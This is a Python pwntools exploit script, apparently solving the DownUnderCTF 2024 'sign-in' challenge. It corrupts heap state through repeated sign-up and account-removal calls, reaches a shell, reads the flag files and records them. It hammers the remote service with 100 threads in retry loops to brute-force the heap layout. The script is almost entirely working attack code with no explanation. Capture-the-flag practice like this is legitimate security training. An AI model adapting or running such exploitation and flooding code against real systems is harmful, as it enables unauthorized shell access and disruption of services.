#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwntmpl -nc 'nc 2024.ductf.dev 30022'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'sign-in')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '2024.ductf.dev'
port = int(args.PORT or 30022)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+157
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

def sign_up(io, username, password):
    io.sendlineafter(b"> ", b"1")
    io.sendafter(b"username: ", username.ljust(8, b"\x00"))
    io.sendafter(b"password: ", password.ljust(8, b"\x00"))
def sign_in(io, username, password):
    io.sendlineafter(b"> ", b"2")

    io.sendafter(b"username: ", username.ljust(8, b"\x00"))
    io.sendafter(b"password: ", password.ljust(8, b"\x00"))


def remove_account(io):
    io.sendlineafter(b"> ", b"3")

def get_shell(io):
    io.sendlineafter(b"> ", b"4")

def sign_in_and_remove(io, username, password):
    sign_in(io, username, password)
    remove_account(io)

HEAP_OFFSET = 0x13cc000
TARGET_ADDR = HEAP_OFFSET + 0x2e0-0x7-0x8
TARGET_ADDR_BIN = p64(TARGET_ADDR)

def exploit(io):
    sign_up(io, b"A", TARGET_ADDR_BIN)
    sign_up(io, b"B", b"b")
    sign_in_and_remove(io, b"A", TARGET_ADDR_BIN)
    sign_up(io, b"A", b"c"*8)
    sign_in_and_remove(io, b"A", b"c"*8)
    sign_in(io, b"B", b"b")
    get_shell(io)
    io.sendline(b"ls")
    ls = io.recvline()
    io.sendline(b"cat flag*")
    flag = io.recvline()

    with open(f"solved{random.random()}.txt", "wb") as f:
        f.write(ls)
        f.write(b"\n\n")
        f.write(flag)

    log.critical("SOLVED")

    io.interactive()

def try_exploit():
    while True:
        io = start()
        try:
            exploit(io)
        except EOFError:
            print("Nope")
        io.close()

threads = []
for i in range(100):
    thread = threading.Thread(target=try_exploit)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
